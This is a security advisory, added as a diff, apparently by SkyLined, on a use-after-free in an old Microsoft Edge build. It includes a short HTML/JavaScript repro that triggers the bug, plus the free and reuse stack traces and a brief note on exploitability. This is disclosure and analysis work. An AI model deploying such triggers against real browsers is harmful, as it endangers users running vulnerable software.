@@ -1,0 +1,67 @@
+1295u Microsoft Edge CTreePosGap::PartitionPointers use-after-free
+=====================================
+
+Synopsis
+--------
+Specially crafted HTML can trigger a use-after-free in Microsoft Edge.
+
+Known affected software and attack vectors
+------------------------------------------
++ Microsoft Edge 20.10240.16384.0
+  An attacker would need to get a target user to open a specially crafted
+  webpage. JavaScript appears to be required to trigger the issue.
+
+Repro
+-----
+    <a><script>
+    setTimeout(function() {
+      x.appendChild(h);
+      setTimeout(function() {
+        x.insertBefore(h,x.firstChild)
+      },0);
+    },0);
+    </script><h id=h><b></a><o><select id=x>x
+
+Description
+-----------
+Free stack:
+EDGEHTML!MemoryProtection::HeapFree+0x2a65e8
+EDGEHTML!CTreeNode::NodeRelease+0x57
+EDGEHTML!Tree::TreeWriter::UnwrapInternal+0x2e
+EDGEHTML!Tree::TreeWriter::Unwrap+0x133
+EDGEHTML!CTreePosGap::PartitionPointers+0x40a
+EDGEHTML!CSpliceTreeEngine::Init+0x17a
+EDGEHTML!Tree::TreeWriter::SpliceTreeInternal+0xcf
+EDGEHTML!Tree::TreeWriter::CutCopyMoveLegacy+0x4e0
+EDGEHTML!Tree::TreeWriter::MoveNodeLegacy+0x193
+EDGEHTML!Tree::TreeWriter::InsertBefore+0x7d
+EDGEHTML!CElement::InsertBeforeHelper+0x129
+EDGEHTML!CElement::InsertBeforeHelper+0x10d
+EDGEHTML!CElement::Var_insertBefore+0x68
+EDGEHTML!CFastDOM::CNode::Trampoline_insertBefore+0x93
+
+Reuse stack:
+EDGEHTML!CTreePosGap::PartitionPointers+0x68
+EDGEHTML!CSpliceTreeEngine::Init+0x290
+EDGEHTML!Tree::TreeWriter::SpliceTreeInternal+0xcf
+EDGEHTML!Tree::TreeWriter::CutCopyMoveLegacy+0x4e0
+EDGEHTML!Tree::TreeWriter::MoveNodeLegacy+0x193
+EDGEHTML!Tree::TreeWriter::InsertBefore+0x7d
+EDGEHTML!CElement::InsertBeforeHelper+0x129
+EDGEHTML!CElement::InsertBeforeHelper+0x10d
+EDGEHTML!CElement::Var_insertBefore+0x68
+EDGEHTML!CFastDOM::CNode::Trampoline_insertBefore+0x93
+
+Exploit
+-------
+From the free & reuse stack, it appears that CSpliceTreeEngine::Init calls
+CTreePosGap::PartitionPointers, which frees the memory and returns. Then
+CSpliceTreeEngine::Init calls CTreePosGap::PartitionPointers again, which
+reuses the memory. This may indicate that there is not enough time between the
+free and reuse to modify the contents of the memory. I did not investigate
+further.
+
+Credit
+------
+If you can confirm this as a security issue and would like to provide credits
+for reporting the issue in your advisory, please credit "SkyLined".
